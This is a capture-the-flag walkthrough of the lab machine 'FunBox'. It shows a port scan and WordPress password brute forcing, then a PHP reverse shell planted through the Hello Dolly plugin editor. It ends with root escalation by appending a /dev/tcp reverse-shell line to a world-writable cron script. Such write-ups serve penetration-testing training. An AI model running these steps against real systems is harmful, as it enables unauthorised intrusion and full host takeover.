---
layout: default
title: FunBox
parent: Proving Grounds Play
nav_order: 14
---

# Scanning

---

```bash
┌──(vagrant㉿kali)-[~/Documents/PG/PLAY/funbox]
└─$ sudo nmap -Pn -p- -sC -sV -T4 --open 192.168.218.77
Starting Nmap 7.94 ( https://nmap.org ) at 2023-11-15 21:49 EST
Nmap scan report for 192.168.218.77
Host is up (0.059s latency).
Not shown: 65531 closed tcp ports (reset)
PORT      STATE SERVICE VERSION                                                                         21/tcp    open  ftp     ProFTPD
22/tcp    open  ssh     OpenSSH 8.2p1 Ubuntu 4 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey:
|   3072 d2:f6:53:1b:5a:49:7d:74:8d:44:f5:46:e3:93:29:d3 (RSA)
|   256 a6:83:6f:1b:9c:da:b4:41:8c:29:f4:ef:33:4b:20:e0 (ECDSA)
|_  256 a6:5b:80:03:50:19:91:66:b6:c3:98:b8:c4:4f:5c:bd (ED25519)
80/tcp    open  http    Apache httpd 2.4.41 ((Ubuntu))
|_http-title: Did not follow redirect to http://funbox.fritz.box/
| http-robots.txt: 1 disallowed entry
|_/secret/
|_http-server-header: Apache/2.4.41 (Ubuntu)
33060/tcp open  mysqlx?
| fingerprint-strings:
|   DNSStatusRequestTCP, LDAPSearchReq, NotesRPC, SSLSessionReq, TLSSessionReq, X11Probe, afp:
|     Invalid message"
|_    HY000
```

# Enumeration

---

## 80 | HTTP

Wordpress site at _funbox.fritz.box_

### WPscan

```bash
[+] admin
 | Found By: Author Posts - Author Pattern (Passive Detection)
 | Confirmed By:
 |  Rss Generator (Passive Detection)
 |  Wp Json Api (Aggressive Detection)
 |   - http://funbox.fritz.box/index.php/wp-json/wp/v2/users/?per_page=100&page=1
 |  Author Id Brute Forcing - Author Pattern (Aggressive Detection)
 |  Login Error Messages (Aggressive Detection)

[+] joe
 | Found By: Author Id Brute Forcing - Author Pattern (Aggressive Detection)
 | Confirmed By: Login Error Messages (Aggressive Detection)

```

Run WPScan brute force attack

```bash
┌──(vagrant㉿kali)-[~/Documents/PG/PLAY/funbox]
└─$ wpscan --url http://funbox.fritz.box --disable-tls-checks -U users.txt -P /usr/share/wordlists/rocky
ou.txt

[+] Performing password attack on Wp Login against 2 user/s
[SUCCESS] - joe / 12345
[SUCCESS] - admin / iubire
Trying admin / violet Time: 00:00:18 <                          > (670 / 28689453)  0.00%  ETA: ??:??:??

[!] Valid Combinations Found:
 | Username: joe, Password: 12345
 | Username: admin, Password: iubire
```

Authenticate to Wordpress as with _admin:iubire_

# Exploitation

---

Attempting Hello Dolly plugin edit exploit.

![dolly1](../../../assets/images/ctfs/proving_grounds/funbox/dolly1.png)

Add the PHP reverse shell script and edit.

![dolly2](../../../assets/images/ctfs/proving_grounds/funbox/dolly2.png)

Activate the Hello Dolly plugin and get a reverse shell.

![dolly3](../../../assets/images/ctfs/proving_grounds/funbox/dolly3.png)

```bash
┌──(vagrant㉿kali)-[~/Documents/PG/PLAY/funbox]
└─$ nc -nlvp 9001
listening on [any] 9001 ...
connect to [192.168.45.217] from (UNKNOWN) [192.168.218.77] 49092
Linux funbox 5.4.0-40-generic #44-Ubuntu SMP Tue Jun 23 00:01:04 UTC 2020 x86_64 x86_64 x86_64 GNU/Linux
 03:14:29 up 28 min,  0 users,  load average: 0.00, 0.05, 0.06
USER     TTY      FROM             LOGIN@   IDLE   JCPU   PCPU WHAT
uid=33(www-data) gid=33(www-data) groups=33(www-data)
/bin/sh: 0: can't access tty; job control turned off
$ id
uid=33(www-data) gid=33(www-data) groups=33(www-data)

```

# Post-Exploitation

---

## Enumerate wp-config.php File

```bash
www-data@funbox:/var/www/html$ cat wp-config.php

// ** MySQL settings - You can get this info from your web host ** //
/** The name of the database for WordPress */
define('DB_NAME', 'wordpress');

/** MySQL database username */
define('DB_USER', 'wordpress');

/** MySQL database password */
define('DB_PASSWORD', 'wordpress');

/** MySQL hostname */
define('DB_HOST', 'localhost');

```

Only shows the users we already have access to.

Switch to Joe.

Enumerate user _funny_ home directory and locate a _.backup.sh_ that is creating a backup of _/var/www/html_ every 1 minute.

```bash
joe@funbox:/home/funny$ ls -la
ls -la
total 47592
drwxr-xr-x 3 funny funny     4096 Aug 21  2020 .
drwxr-xr-x 4 root  root      4096 Jun 19  2020 ..
-rwxrwxrwx 1 funny funny       55 Aug 21  2020 .backup.sh
lrwxrwxrwx 1 funny funny        9 Aug 21  2020 .bash_history -> /dev/null
-rw-r--r-- 1 funny funny      220 Feb 25  2020 .bash_logout
-rw-r--r-- 1 funny funny     3771 Feb 25  2020 .bashrc
drwx------ 2 funny funny     4096 Jun 19  2020 .cache
-rw-rw-r-- 1 funny funny 48701440 Nov 16 03:36 html.tar
-rw-r--r-- 1 funny funny      807 Feb 25  2020 .profile
-rw-rw-r-- 1 funny funny      162 Jun 19  2020 .reminder.sh
joe@funbox:/home/funny$ cat .backup.sh
cat .backup.sh
#!/bin/bash
tar -cf /home/funny/html.tar /var/www/html

```

_.backup.sh_ is world writeable so we can edit this script to give us a reverse shell as _root_ user.

```bash
joe@funbox:/home/funny$ echo '/bin/bash -i >& /dev/tcp/192.168.45.217/9002 0>&1' >> .backup.sh
echo '/bin/bash -i >& /dev/tcp/192.168.45.217/9002 0>&1' >> .backup.sh
joe@funbox:/home/funny$ cat .backup.sh
cat .backup.sh
#!/bin/bash
tar -cf /home/funny/html.tar /var/www/html
/bin/bash -i >& /dev/tcp/192.168.45.217/9002 0>&1
```

After a couple minutes we get a reverse shell as _root_

```bash
┌──(vagrant㉿kali)-[~/Documents/PG/PLAY/funbox]
└─$ nc -nlvp 9002
listening on [any] 9002 ...
connect to [192.168.45.217] from (UNKNOWN) [192.168.218.77] 41312
bash: cannot set terminal process group (4896): Inappropriate ioctl for device
bash: no job control in this shell
root@funbox:~# id
id
uid=0(root) gid=0(root) groups=0(root)
root@funbox:~# whoami
whoami
root
root@funbox:~# cat /root/proof.txt
cat /root/proof.txt
3d96************************
```
